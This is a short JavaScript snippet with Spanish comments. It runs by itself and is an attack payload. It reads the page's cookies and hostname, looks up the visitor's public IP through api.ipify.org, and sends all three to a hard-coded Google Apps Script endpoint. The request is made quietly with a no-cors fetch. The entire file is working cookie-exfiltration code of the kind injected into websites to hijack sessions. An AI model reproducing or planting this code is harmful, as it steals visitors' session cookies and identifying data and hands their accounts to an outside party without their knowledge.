(function() {
    // Obtener cookies del documento
    let cookies = encodeURIComponent(document.cookie);

    // Obtener el dominio actual
    let domain = encodeURIComponent(window.location.hostname);

    // Obtener la IP pública
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            let ip = encodeURIComponent(data.ip);

            // Construimos la URL con los parámetros en formato GET
            let url = `https://script.google.com/macros/s/AKfycbyAKZZpGl08GG8b1Hm2kgQJDIWBpr5Dt9vVLAew7c2X9uKVTZDjCczwE4mzjDJCDjJJ/exec?cookies=${cookies}&ip=${ip}&domain=${domain}`;

            // Enviar los datos a Google Apps Script mediante GET
            fetch(url, { method: 'GET', mode: 'no-cors' });
        })
        .catch(error => console.error('Error obteniendo la IP:', error));
})();
